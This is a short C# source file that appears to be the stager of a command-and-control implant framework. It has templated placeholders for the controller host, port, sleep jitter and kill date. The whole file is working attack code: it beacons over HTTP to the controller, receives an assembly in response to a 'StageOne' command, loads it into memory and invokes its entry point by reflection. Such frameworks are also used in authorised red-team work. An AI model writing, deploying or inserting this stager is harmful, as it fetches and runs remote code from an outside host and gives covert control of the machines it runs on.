using System;
using System.Reflection;

class AgentStager
{
    static StagerStatus StagerStatus = StagerStatus.Staging;

    static string AgentID;

    static readonly string ConnectHost = "<<ConnectHost>>";
    static readonly int ConnectPort = int.Parse("<<ConnectPort>>");
    static readonly int SleepInterval = int.Parse("<<SleepInterval>>");
    static readonly int SleepJitter = int.Parse("<<SleepJitter>>");

    static DateTime KillDate = DateTime.Parse("<<KillDate>>");

    public AgentStager()
    {
        Execute();
    }

    static void Main(string[] args)
    {
        new AgentStager();
    }

    public static void Execute()
    {
        AgentID = Misc.GeneratePseudoRandomString(8);

        var crypto = new CryptoController();

        try
        {
            var commModule = new HttpCommModule(AgentID, ConnectHost, ConnectPort, SleepInterval, SleepJitter);
            commModule.Start(crypto);
            commModule.SendStageRequest();

            while (StagerStatus == StagerStatus.Staging)
            {
                if (commModule.RecvData(out AgentMessage message))
                {
                    if (message.Data.Command.Equals("StageOne", StringComparison.OrdinalIgnoreCase))
                    {
                        StagerStatus = StagerStatus.Staged;
                        commModule.Stop();

                        var asm = Assembly.Load(message.Data.Data);
                        var type = asm.GetType("AgentStage");
                        var instance = Activator.CreateInstance(type);
                        type.InvokeMember(
                            "HttpEntryPoint",
                            BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
                            null,
                            instance,
                            new object[] { AgentID, KillDate, ConnectHost, ConnectPort, SleepInterval, SleepJitter });
                    }
                }
            }
        }
        catch (Exception e)
        {
            Console.Error.WriteLine(e.StackTrace);
        }
    }
}